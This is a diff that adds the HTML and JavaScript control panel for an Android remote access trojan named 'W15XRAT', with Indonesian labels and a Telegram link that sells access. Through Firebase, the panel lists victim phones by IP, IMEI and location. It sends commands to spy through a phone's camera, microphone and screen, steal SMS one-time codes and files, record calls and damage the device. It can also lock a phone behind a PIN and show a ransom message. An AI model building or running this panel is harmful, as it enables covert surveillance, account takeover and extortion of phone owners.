@@ -1,0 +1,1028 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>W15XRAT • ADMIN PANEL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: #030014;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+            position: relative;
+        }
+
+        /* Efek neon background */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(180, 0, 255, 0.15) 0%, transparent 30%),
+                radial-gradient(circle at 80% 70%, rgba(255, 0, 150, 0.15) 0%, transparent 35%),
+                radial-gradient(circle at 40% 80%, rgba(0, 200, 255, 0.1) 0%, transparent 40%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* HALAMAN LOGIN */
+        .halaman-login {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(10, 5, 20, 0.95);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 40px;
+            border: 1px solid rgba(200, 100, 255, 0.5);
+            box-shadow: 
+                0 20px 40px rgba(0,0,0,0.9),
+                0 0 30px rgba(200, 0, 255, 0.3),
+                inset 0 0 30px rgba(255, 0, 150, 0.2);
+            overflow: hidden;
+            padding: 28px 24px 35px;
+            position: relative;
+            z-index: 10;
+            animation: neonPulse 4s infinite;
+        }
+
+        @keyframes neonPulse {
+            0%, 100% { box-shadow: 0 20px 40px rgba(0,0,0,0.9), 0 0 30px rgba(200, 0, 255, 0.3), inset 0 0 30px rgba(255, 0, 150, 0.2); }
+            50% { box-shadow: 0 20px 50px rgba(0,0,0,0.9), 0 0 50px rgba(255, 0, 200, 0.5), inset 0 0 50px rgba(200, 0, 255, 0.3); }
+        }
+
+        .gambar-login {
+            width: 100%;
+            border-radius: 25px;
+            overflow: hidden;
+            border: 2px solid rgba(255, 100, 200, 0.8);
+            box-shadow: 0 0 40px rgba(255, 0, 150, 0.5);
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .gambar-login::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: shine 5s infinite;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+
+        .gambar-login img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .label-login {
+            color: rgba(255, 150, 200, 0.9);
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: block;
+            text-shadow: 0 0 15px rgba(255, 0, 200, 0.8);
+        }
+
+        .input-wrapper {
+            background: rgba(20, 10, 30, 0.7);
+            border: 1px solid rgba(255, 100, 200, 0.6);
+            border-radius: 20px;
+            padding: 0 18px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 22px;
+            box-shadow: 0 0 20px rgba(255, 0, 150, 0.2), inset 0 0 15px rgba(255, 0, 200, 0.1);
+            backdrop-filter: blur(5px);
+            transition: 0.3s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: rgba(255, 0, 255, 0.9);
+            box-shadow: 0 0 30px rgba(255, 0, 200, 0.5), inset 0 0 20px rgba(255, 0, 255, 0.2);
+        }
+
+        .input-wrapper input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: white;
+            font-size: 15px;
+            padding: 16px 0;
+            width: 100%;
+        }
+
+        .input-wrapper input::placeholder {
+            color: rgba(255, 150, 200, 0.5);
+        }
+
+        .input-icon {
+            color: rgba(255, 100, 200, 0.9);
+            margin-right: 12px;
+            font-size: 18px;
+            text-shadow: 0 0 15px rgba(255, 0, 200, 0.8);
+        }
+
+        .password-field {
+            font-family: 'Courier New', monospace;
+            font-size: 22px;
+            letter-spacing: 5px;
+            color: white !important;
+        }
+
+        .tombol-masuk {
+            width: 100%;
+            background: linear-gradient(145deg, rgba(150, 0, 200, 0.3), rgba(200, 0, 150, 0.5));
+            border: 2px solid rgba(255, 100, 200, 0.8);
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 17px;
+            border-radius: 50px;
+            margin: 30px 0 18px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            box-shadow: 
+                0 10px 0 rgba(100, 0, 100, 0.5),
+                0 0 40px rgba(255, 0, 200, 0.5),
+                inset 0 0 20px rgba(255, 255, 255, 0.3);
+            cursor: pointer;
+            transition: 0.1s;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tombol-masuk::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .tombol-masuk:hover::before {
+            left: 100%;
+        }
+
+        .tombol-masuk:active {
+            transform: translateY(5px);
+            box-shadow: 0 5px 0 rgba(100, 0, 100, 0.5), 0 0 50px rgba(255, 0, 200, 0.7);
+        }
+
+        /* TOMBOL BELI AKUN */
+        .tombol-beli {
+            width: 100%;
+            background: linear-gradient(145deg, rgba(200, 0, 150, 0.3), rgba(255, 0, 200, 0.6));
+            border: 2px solid rgba(255, 100, 255, 0.9);
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            padding: 16px;
+            border-radius: 50px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 8px 0 rgba(150, 0, 100, 0.6), 0 0 40px rgba(255, 0, 255, 0.5);
+            cursor: pointer;
+            text-align: center;
+            transition: 0.1s;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        .tombol-beli::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: 0.5s;
+        }
+
+        .tombol-beli:hover::before {
+            left: 100%;
+        }
+
+        .tombol-beli:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 rgba(150, 0, 100, 0.6), 0 0 60px rgba(255, 0, 255, 0.8);
+        }
+
+        /* NOTIFIKASI TOAST */
+        .toast-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(20, 10, 30, 0.95);
+            border: 2px solid rgba(255, 100, 200, 0.8);
+            border-radius: 50px;
+            padding: 12px 24px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            box-shadow: 0 0 30px rgba(255, 0, 200, 0.5);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: none;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateX(-50%) translateY(100px); opacity: 0; }
+            to { transform: translateX(-50%) translateY(0); opacity: 1; }
+        }
+
+        .toast-notification.show {
+            display: block;
+        }
+
+        /* HALAMAN DASHBOARD */
+        .halaman-dashboard {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(8, 3, 18, 0.98);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 40px;
+            border: 1px solid rgba(200, 100, 255, 0.5);
+            box-shadow: 
+                0 20px 50px rgba(0,0,0,0.95),
+                0 0 40px rgba(200, 0, 255, 0.4),
+                inset 0 0 30px rgba(255, 0, 150, 0.2);
+            overflow-y: auto;
+            max-height: 95vh;
+            display: none;
+            position: relative;
+            z-index: 10;
+        }
+
+        .dashboard-header {
+            padding: 22px 22px 12px;
+            border-bottom: 1px solid rgba(255, 100, 200, 0.3);
+        }
+
+        .dashboard-gambar {
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 2px solid rgba(255, 100, 200, 0.8);
+            box-shadow: 0 0 40px rgba(255, 0, 150, 0.4);
+            margin-bottom: 15px;
+        }
+
+        .dashboard-gambar img {
+            width: 100%;
+            display: block;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(20, 10, 30, 0.6);
+            padding: 12px 18px;
+            border-radius: 40px;
+            margin: 10px 0 5px;
+            border: 1px solid rgba(255, 100, 200, 0.5);
+            box-shadow: 0 0 20px rgba(255, 0, 150, 0.2), inset 0 0 10px rgba(255, 0, 200, 0.1);
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: rgba(255, 200, 255, 0.9);
+            font-size: 13px;
+            text-shadow: 0 0 10px rgba(255, 0, 200, 0.5);
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #4aff7a;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #00ff80;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* KONTEN HALAMAN */
+        .page-content {
+            padding: 15px 20px 20px;
+            display: block;
+        }
+
+        .page-content.hidden {
+            display: none;
+        }
+
+        /* SECTION TITLE */
+        .section-title {
+            color: rgba(255, 150, 200, 0.9);
+            font-size: 16px;
+            font-weight: 700;
+            margin: 20px 0 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-left: 4px solid rgba(255, 0, 200, 0.8);
+            padding-left: 12px;
+            text-shadow: 0 0 20px rgba(255, 0, 200, 0.8);
+        }
+
+        /* ===== HOME PAGE ===== */
+        .fitur-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .fitur-item {
+            background: rgba(20, 10, 30, 0.7);
+            border: 1px solid rgba(255, 100, 200, 0.5);
+            border-radius: 25px;
+            padding: 18px 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 0 rgba(80, 0, 80, 0.5), 0 0 20px rgba(255, 0, 150, 0.2);
+            backdrop-filter: blur(5px);
+        }
+
+        .fitur-item:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 rgba(80, 0, 80, 0.5), 0 0 30px rgba(255, 0, 200, 0.5);
+            background: rgba(40, 20, 50, 0.8);
+            border-color: rgba(255, 0, 255, 0.8);
+        }
+
+        .fitur-icon {
+            font-size: 32px;
+            color: rgba(255, 150, 200, 0.9);
+            text-shadow: 0 0 25px rgba(255, 0, 200, 0.8);
+        }
+
+        .fitur-text {
+            font-size: 13px;
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 0 15px rgba(255, 0, 200, 0.5);
+        }
+
+        /* ===== LOCK HP SECTION ===== */
+        .lock-section {
+            background: rgba(255, 100, 100, 0.15);
+            border: 2px solid #ff6b6b;
+            border-radius: 25px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .lock-title {
+            color: #ff6b6b;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .lock-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .lock-input-group input, .lock-input-group select {
+            flex: 1;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #ff6b6b;
+            border-radius: 15px;
+            padding: 12px 15px;
+            color: white;
+            outline: none;
+        }
+
+        .lock-input-group input::placeholder {
+            color: rgba(255,255,255,0.4);
+        }
+
+        .lock-select {
+            width: 100%;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #ff6b6b;
+            border-radius: 15px;
+            padding: 12px 15px;
+            color: white;
+            margin-bottom: 15px;
+        }
+
+        .lock-btn {
+            background: linear-gradient(135deg, #ff6b6b, #ff4444);
+            border: none;
+            border-radius: 50px;
+            padding: 15px;
+            color: white;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .unlock-btn {
+            background: linear-gradient(135deg, #4aff7a, #00cc66);
+            border: none;
+            border-radius: 50px;
+            padding: 15px;
+            color: white;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        /* ===== TARGET CARDS ===== */
+        .hp-card {
+            background: rgba(20, 10, 30, 0.7);
+            border: 1px solid rgba(255, 100, 200, 0.5);
+            border-radius: 25px;
+            padding: 20px;
+            margin-bottom: 18px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 0 rgba(80, 0, 80, 0.5), 0 0 25px rgba(255, 0, 150, 0.2);
+        }
+
+        .hp-card:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 rgba(80, 0, 80, 0.5), 0 0 35px rgba(255, 0, 200, 0.5);
+            background: rgba(40, 20, 50, 0.8);
+            border-color: rgba(255, 0, 255, 0.8);
+        }
+
+        .hp-row {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            margin-bottom: 15px;
+        }
+
+        .hp-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(30, 15, 40, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            border: 2px solid rgba(255, 100, 200, 0.8);
+            box-shadow: 0 0 30px rgba(255, 0, 150, 0.4);
+        }
+
+        .hp-info {
+            flex: 1;
+        }
+
+        .hp-nama {
+            font-weight: 700;
+            color: white;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-shadow: 0 0 15px rgba(255, 0, 200, 0.5);
+        }
+
+        .hp-badge {
+            background: rgba(0, 200, 100, 0.3);
+            border: 1px solid #4aff7a;
+            color: #a0ffa0;
+            font-size: 11px;
+            padding: 3px 8px;
+            border-radius: 30px;
+        }
+
+        .lock-badge {
+            background: rgba(255, 68, 68, 0.3);
+            border: 1px solid #ff4444;
+            color: #ff8888;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 30px;
+            margin-left: 5px;
+        }
+
+        .hp-ip {
+            color: rgba(255, 150, 200, 0.8);
+            font-size: 13px;
+            font-family: monospace;
+            margin-top: 6px;
+        }
+
+        .hp-stats {
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid rgba(255, 100, 200, 0.3);
+            padding-top: 12px;
+            font-size: 12px;
+            color: rgba(255, 200, 255, 0.8);
+        }
+
+        .hp-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .hp-action-btn {
+            background: rgba(30, 15, 40, 0.6);
+            border: 1px solid rgba(255, 100, 200, 0.5);
+            border-radius: 30px;
+            padding: 8px 2px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 4px 0 rgba(80, 0, 80, 0.5);
+            transition: 0.1s;
+        }
+
+        .hp-action-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 rgba(80, 0, 80, 0.5);
+            background: rgba(60, 30, 70, 0.8);
+        }
+
+        /* Target Info */
+        .target-info {
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid #ff69b4;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 12px;
+        }
+
+        /* BOTTOM NAV */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(10, 5, 20, 0.9);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(255, 100, 200, 0.5);
+            padding: 10px 4px;
+            margin-top: 10px;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: rgba(255, 150, 200, 0.7);
+            font-size: 11px;
+            gap: 3px;
+            cursor: pointer;
+            padding: 8px 8px;
+            border-radius: 30px;
+            transition: 0.2s;
+            flex: 1;
+        }
+
+        .nav-item.active {
+            color: white;
+            background: rgba(255, 100, 200, 0.2);
+            text-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
+            box-shadow: 0 0 25px rgba(255, 0, 200, 0.4);
+        }
+
+        .nav-item span:first-child {
+            font-size: 24px;
+        }
+
+        .nav-badge {
+            background: rgba(255, 0, 200, 0.8);
+            color: white;
+            font-size: 9px;
+            padding: 2px 6px;
+            border-radius: 30px;
+        }
+    </style>
+    
+    <!-- Firebase SDK (versi compat untuk mudah digunakan) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+</head>
+<body>
+    <!-- Toast Notification -->
+    <div class="toast-notification" id="toast"></div>
+
+    <!-- HALAMAN LOGIN -->
+    <div class="halaman-login" id="halamanLogin">
+        <div class="gambar-login">
+            <img src="https://i.ibb.co.com/39nSN5dk/4056ef8a-3548-4030-96de-cd84df16806c.png" alt="W15XRAT">
+        </div>
+
+        <label class="label-login">EMAIL</label>
+        <div class="input-wrapper">
+            <span class="input-icon">📧</span>
+            <input type="email" id="emailLogin" placeholder="email@contoh.com">
+        </div>
+
+        <label class="label-login">KATA SANDI</label>
+        <div class="input-wrapper">
+            <span class="input-icon">🔒</span>
+            <input type="password" class="password-field" id="passwordLogin" placeholder="password">
+        </div>
+
+        <button class="tombol-masuk" id="btnMasuk">MASUK</button>
+        
+        <a href="https://t.me/+6283145066569" target="_blank" style="text-decoration: none; display: block;">
+            <div class="tombol-beli" id="btnBeliAkun">BELI W15XRAT</div>
+        </a>
+    </div>
+
+    <!-- HALAMAN DASHBOARD -->
+    <div class="halaman-dashboard" id="halamanDashboard">
+        <div class="dashboard-header">
+            <div class="dashboard-gambar">
+                <img src="https://i.ibb.co.com/39nSN5dk/4056ef8a-3548-4030-96de-cd84df16806c.png" alt="W15XRAT">
+            </div>
+            <div class="status-bar">
+                <div class="status-item" id="targetCount"><span class="status-dot"></span> 0 Target</div>
+                <div class="status-item" id="dataSize"><span>📦</span> 0 GB</div>
+                <div class="status-item" id="otpCount"><span>📨</span> 0 OTP</div>
+            </div>
+        </div>
+
+        <!-- HOME PAGE -->
+        <div id="page-home" class="page-content">
+            <div class="section-title">PANEL SADAP</div>
+            <div class="fitur-grid">
+                <div class="fitur-item" id="btnKamera"><span class="fitur-icon">📷</span><span class="fitur-text">Kamera</span></div>
+                <div class="fitur-item" id="btnSinyal"><span class="fitur-icon">📡</span><span class="fitur-text">Sinyal</span></div>
+                <div class="fitur-item" id="btnKunci"><span class="fitur-icon">🔒</span><span class="fitur-text">Kunci HP</span></div>
+                <div class="fitur-item" id="btnSMS"><span class="fitur-icon">📨</span><span class="fitur-text">SMS OTP</span></div>
+                <div class="fitur-item" id="btnLokasi"><span class="fitur-icon">📍</span><span class="fitur-text">Lokasi</span></div>
+                <div class="fitur-item" id="btnMatikanSinyal"><span class="fitur-icon">📴</span><span class="fitur-text">Matikan Sinyal</span></div>
+                <div class="fitur-item" id="btnAwasi"><span class="fitur-icon">👁️</span><span class="fitur-text">Awasi Layar</span></div>
+                <div class="fitur-item" id="btnMikrofon"><span class="fitur-icon">🎙️</span><span class="fitur-text">Mikrofon</span></div>
+                <div class="fitur-item" id="btnFile"><span class="fitur-icon">📂</span><span class="fitur-text">Ambil File</span></div>
+                <div class="fitur-item" id="btnTelepon"><span class="fitur-icon">📞</span><span class="fitur-text">Rekam Telepon</span></div>
+            </div>
+
+            <!-- LOCK HP SECTION -->
+            <div class="lock-section">
+                <div class="lock-title">
+                    <span>🔒</span> LOCK TASK TOTAL
+                </div>
+                <select class="lock-select" id="targetSelect">
+                    <option value="">Pilih target...</option>
+                </select>
+                <div class="lock-input-group">
+                    <input type="text" id="lockPin" placeholder="PIN 6 digit (contoh: 123456)" maxlength="6">
+                </div>
+                <div class="lock-input-group">
+                    <input type="text" id="lockOwner" placeholder="Nama Admin (contoh: VINAL)">
+                </div>
+                <div class="lock-input-group">
+                    <input type="text" id="lockMessage" placeholder="Pesan lock (contoh: BAYAR Rp 500.000)">
+                </div>
+                <button class="lock-btn" id="lockTargetBtn">
+                    <span>🔒</span> LOCK TARGET
+                </button>
+                <button class="unlock-btn" id="unlockTargetBtn">
+                    <span>🔓</span> UNLOCK TARGET
+                </button>
+            </div>
+        </div>
+
+        <!-- HP PAGE -->
+        <div id="page-hp" class="page-content hidden">
+            <div class="section-title">DAFTAR TARGET</div>
+            <div id="targetList"></div>
+        </div>
+
+        <!-- BOTTOM NAV -->
+        <div class="bottom-nav">
+            <div class="nav-item active" data-page="home"><span>🏠</span><span>Home</span></div>
+            <div class="nav-item" data-page="hp"><span>📱</span><span>HP <span class="nav-badge" id="hpBadge">0</span></span></div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI FIREBASE ANDA ====================
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAILWpyuyt-yHhvW5P0j7R0-_bY3rhWjAk",
+            authDomain: "w15xrat-c08ca.firebaseapp.com",
+            projectId: "w15xrat-c08ca",
+            storageBucket: "w15xrat-c08ca.firebasestorage.app",
+            messagingSenderId: "525030155136",
+            appId: "1:525030155136:web:e9250d6674674b3cea5765"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const auth = firebase.auth();
+
+        // ==================== ELEMEN ====================
+        const halamanLogin = document.getElementById('halamanLogin');
+        const halamanDashboard = document.getElementById('halamanDashboard');
+        const btnMasuk = document.getElementById('btnMasuk');
+        const emailLogin = document.getElementById('emailLogin');
+        const passwordLogin = document.getElementById('passwordLogin');
+        const toast = document.getElementById('toast');
+        
+        // Elemen Lock
+        const targetSelect = document.getElementById('targetSelect');
+        const lockPin = document.getElementById('lockPin');
+        const lockOwner = document.getElementById('lockOwner');
+        const lockMessage = document.getElementById('lockMessage');
+        const lockTargetBtn = document.getElementById('lockTargetBtn');
+        const unlockTargetBtn = document.getElementById('unlockTargetBtn');
+
+        // ==================== FUNGSI TOAST ====================
+        function showToast(message, isSuccess = true) {
+            toast.textContent = message;
+            toast.style.borderColor = isSuccess ? 'rgba(255, 100, 200, 0.8)' : 'rgba(255, 0, 0, 0.8)';
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ==================== CEK BELI AKUN ====================
+        function checkBeliAkun() {
+            showToast('⚠️ Harap beli akun dulu!!', false);
+        }
+
+        // ==================== LOGIN ====================
+        btnMasuk.addEventListener('click', function() {
+            const email = emailLogin.value.trim();
+            const password = passwordLogin.value.trim();
+
+            if (!email || !password) {
+                showToast('⚠️ Email dan password harus diisi', false);
+                return;
+            }
+
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    showToast('✅ Berhasil masuk!');
+                    halamanLogin.style.display = 'none';
+                    halamanDashboard.style.display = 'block';
+                    loadUserData(userCredential.user.uid);
+                })
+                .catch((error) => {
+                    let msg = '❌ Login gagal';
+                    if (error.code === 'auth/user-not-found' || error.code === 'auth/wrong-password') {
+                        msg = '❌ Harap beli akun dulu!!';
+                    }
+                    showToast(msg, false);
+                });
+        });
+
+        // ==================== LOAD DATA USER ====================
+        function loadUserData(uid) {
+            database.ref('targets').on('value', (snapshot) => {
+                const targets = snapshot.val();
+                const targetList = document.getElementById('targetList');
+                const targetCount = document.getElementById('targetCount');
+                const hpBadge = document.getElementById('hpBadge');
+                
+                targetSelect.innerHTML = '<option value="">Pilih target...</option>';
+                
+                if (targets) {
+                    const targetArray = Object.values(targets);
+                    targetCount.innerHTML = `<span class="status-dot"></span> ${targetArray.length} Target`;
+                    hpBadge.textContent = targetArray.length;
+                    
+                    renderTargetList(targets);
+                    
+                    Object.keys(targets).forEach((key) => {
+                        const target = targets[key];
+                        const option = document.createElement('option');
+                        option.value = key;
+                        option.textContent = `${target.name || 'Unknown'} - ${target.ip || 'No IP'} ${target.locked ? '🔒' : ''}`;
+                        targetSelect.appendChild(option);
+                    });
+                } else {
+                    targetCount.innerHTML = `<span class="status-dot"></span> 0 Target`;
+                    hpBadge.textContent = '0';
+                    targetList.innerHTML = '<div class="hp-card">Belum ada target</div>';
+                }
+            });
+        }
+
+        // ==================== RENDER TARGET LIST ====================
+        function renderTargetList(targets) {
+            const targetList = document.getElementById('targetList');
+            let html = '';
+            
+            Object.keys(targets).forEach((key) => {
+                const target = targets[key];
+                const lockStatus = target.locked ? '<span class="lock-badge">🔒 LOCKED</span>' : '';
+                
+                html += `
+                    <div class="hp-card" data-target-id="${key}">
+                        <div class="hp-row">
+                            <div class="hp-icon">📱</div>
+                            <div class="hp-info">
+                                <div class="hp-nama">
+                                    ${target.name || 'Unknown'}
+                                    <span class="hp-badge">${target.status || 'ONLINE'}</span>
+                                    ${lockStatus}
+                                </div>
+                                <div class="hp-ip">${target.ip || '-'} • ${target.location || '-'}</div>
+                            </div>
+                        </div>
+                        <div class="hp-stats">
+                            <span>${target.os || 'Android'}</span>
+                            <span>IMEI: ${target.imei || '****'}</span>
+                            <span>Baterai ${target.battery || '0'}%</span>
+                        </div>
+                        ${target.locked ? `
+                        <div class="target-info">
+                            🔒 LOCKED - PIN: ${target.lockPin} | Owner: ${target.lockOwner}<br>
+                            Pesan: ${target.lockMessage}
+                        </div>
+                        ` : ''}
+                        <div class="hp-actions">
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'lokasi')">Lokasi</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'kamera')">Kamera</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'sms')">SMS</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'kunci')">Kunci</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'file')">File</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'mikrofon')">Mikrofon</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'telepon')">Telepon</div>
+                            <div class="hp-action-btn" onclick="aksesTarget('${key}', 'rusak')">Rusak</div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            targetList.innerHTML = html;
+        }
+
+        // ==================== AKSES TARGET ====================
+        window.aksesTarget = function(targetId, aksi) {
+            showToast(`📱 Mengirim perintah ${aksi} ke target...`);
+            
+            database.ref('target_actions/' + targetId).push({
+                action: aksi,
+                timestamp: new Date().toISOString(),
+                from: auth.currentUser?.email || 'admin'
+            });
+            
+            setTimeout(() => {
+                showToast(`✅ Perintah ${aksi} terkirim ke target`);
+            }, 1000);
+        };
+
+        // ==================== LOCK TARGET ====================
+        lockTargetBtn.addEventListener('click', function() {
+            const targetId = targetSelect.value;
+            const pin = lockPin.value.trim();
+            const owner = lockOwner.value.trim() || 'ADMIN';
+            const message = lockMessage.value.trim() || 'DEVICE TERKUNCI OLEH ADMIN';
+            
+            if (!targetId) {
+                showToast('⚠️ Pilih target!', false);
+                return;
+            }
+            
+            if (!pin || pin.length !== 6) {
+                showToast('⚠️ PIN harus 6 digit!', false);
+                return;
+            }
+            
+            database.ref('targets/' + targetId).update({
+                locked: true,
+                lockPin: pin,
+                lockOwner: owner,
+                lockMessage: message,
+                lockTime: new Date().toISOString()
+            }).then(() => {
+                showToast(`🔒 Target locked dengan PIN: ${pin}`);
+                lockPin.value = '';
+                lockOwner.value = '';
+                lockMessage.value = '';
+            });
+        });
+
+        // ==================== UNLOCK TARGET ====================
+        unlockTargetBtn.addEventListener('click', function() {
+            const targetId = targetSelect.value;
+            
+            if (!targetId) {
+                showToast('⚠️ Pilih target!', false);
+                return;
+            }
+            
+            database.ref('targets/' + targetId).update({
+                locked: false,
+                lockPin: null
+            }).then(() => {
+                showToast('🔓 Target unlocked');
+            });
+        });
+
+        // ==================== HOME BUTTONS ====================
+        document.querySelectorAll('.fitur-item').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const aksi = this.querySelector('.fitur-text').textContent;
+                showToast(`📱 Mengakses ${aksi} target terpilih...`);
+                
+                const targetId = targetSelect.value;
+                if (targetId) {
+                    database.ref('target_actions/' + targetId).push({
+                        action: aksi,
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            });
+        });
+
+        // ==================== NAVIGASI ====================
+        const pages = {
+            home: document.getElementById('page-home'),
+            hp: document.getElementById('page-hp')
+        };
+
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', function() {
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                this.classList.add('active');
+
+                Object.values(pages).forEach(page => page.classList.add('hidden'));
+
+                const pageId = this.getAttribute('data-page');
+                if (pages[pageId]) {
+                    pages[pageId].classList.remove('hidden');
+                }
+            });
+        });
+
+        // ==================== INIT ====================
+        function init() {
+            passwordLogin.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') btnMasuk.click();
+            });
+
+            auth.onAuthStateChanged((user) => {
+                if (user) {
+                    halamanLogin.style.display = 'none';
+                    halamanDashboard.style.display = 'block';
+                    loadUserData(user.uid);
+                }
+            });
+        }
+
+        init();
+    </script>
+</body>
+</html>
